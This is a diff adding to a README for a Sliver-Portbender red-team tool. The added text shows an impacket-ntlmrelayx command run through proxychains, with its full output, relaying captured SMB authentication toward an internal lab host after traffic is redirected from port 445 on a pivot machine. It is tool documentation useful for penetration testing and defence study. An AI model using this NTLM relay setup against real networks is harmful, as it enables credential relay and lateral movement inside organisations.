@@ -44,6 +44,50 @@ By running `portbender` you can already get a help message. Here the functionali
 Here how to use Sliver-Portbender in sliver in order to redirect traffic from port 445 to port 8445 and then relay incoming traffic with ntlmrelayx in the internal network.
 Be careful It is first necessary to upload `WinDivert64.sys` in the pivot machine to the path `C:\Windows\System32\drivers`. Later it is necessary to change directory to `C:\Windows\System32\drivers`.
 
+Starting ntlmrelayx:
+```
+
+┌──(kali㉿kali)-[~]
+└─$ proxychains4 impacket-ntlmrelayx -smb2support -t smb://WIN-ICSQJ44N1F3.contoso.local --no-http-server
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
+[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
+[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
+[*] SMBD-Thread-6 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
+[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
+
+```
+
 Creating socks proxy, port forwarding rule and portbender rule in session:
 
 ```
